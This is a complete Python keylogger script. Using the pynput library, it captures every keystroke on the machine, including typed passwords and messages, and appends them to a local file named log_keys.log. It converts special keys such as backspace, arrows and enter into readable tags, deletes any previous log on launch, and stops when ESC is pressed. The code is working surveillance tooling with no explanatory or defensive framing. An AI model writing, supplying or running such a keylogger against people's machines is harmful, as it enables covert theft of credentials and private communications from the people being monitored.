from pynput.keyboard import Key, Listener
import os
import time

chars = []
count = 0

# builds a list of chars to be written to file
def on_press(key):        
    global chars , count        
    if key == Key.space:        
        chars.append(" ")    
    else:        
        chars.append(key)        
        count += 1        
        if count > 0:
            count = 0
            write_file(chars)
            chars = []
            
# this function waits checks if the ESC key has been pressed
def on_release(key):
    if (key == Key.esc):
        listen.stop()
		
def write_file(chars):
    # open file and write characters
    with open('log_keys.log','a') as file:
        # check through the chars and print special chars
        for i in chars:
            k = str(i).replace("'","")
            if i == Key.backspace:
                file.write('[backspace]')
            elif i == Key.up:
                file.write("  [up] ")
            elif i == Key.down:
                file.write("[down] ")
            elif i == Key.right:
                file.write(" [->] ")
            elif i == Key.left:
                file.write(" [<-] ")
            elif i == Key.enter:
                file.write('\n')
            elif i == Key.ctrl_l or i == Key.shift or i == Key.tab or i == Key.alt_l or i ==Key.esc:
                file.write("")
            else:
                file.write(k)

# function to run the Listener with key presses and ESC
def run_logger():
    global listen
    with Listener(on_press = on_press , on_release = on_release) as listen:
	    listen.join()

time.sleep(2)
# remove the log file before running.
if os.path.exists('log_keys.log'):
	os.remove('log_keys.log')

run_logger()
